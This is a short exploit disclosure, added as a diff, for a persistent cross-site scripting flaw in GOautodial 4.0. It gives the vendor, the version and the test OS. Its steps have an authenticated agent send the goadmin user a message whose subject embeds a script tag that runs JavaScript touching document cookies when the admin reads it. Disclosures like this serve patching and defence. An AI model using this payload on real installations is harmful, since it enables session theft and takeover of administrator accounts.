@@ -1,0 +1,16 @@
+# Exploit Title: GOautodial 4.0 - Persistent Cross-Site Scripting (Authenticated)
+# Author: Balzabu
+# Discovery Date: 2020-07-23
+# Vendor Homepage: https://goautodial.org/
+# Software Link: https://goautodial.org/GOautodial-4-x86_64-Final-20191010-0150.iso.html
+# Tested Version: 4.0 (Last relase as of today)
+# Tested on OS: CentOS 7
+
+# STEPS TO REPRODUCE:
+
+# 1 - Log in as an agent
+# 2 - Write a new message to user goadmin with:
+Subject: Help me, I can't connect to the webphone <script src=1
+href=1 onerror="javascript:alert(document.cookies)"></script>
+Text: whatever you want
+# 3 - Send and wait for goadmin to read the message... :-)
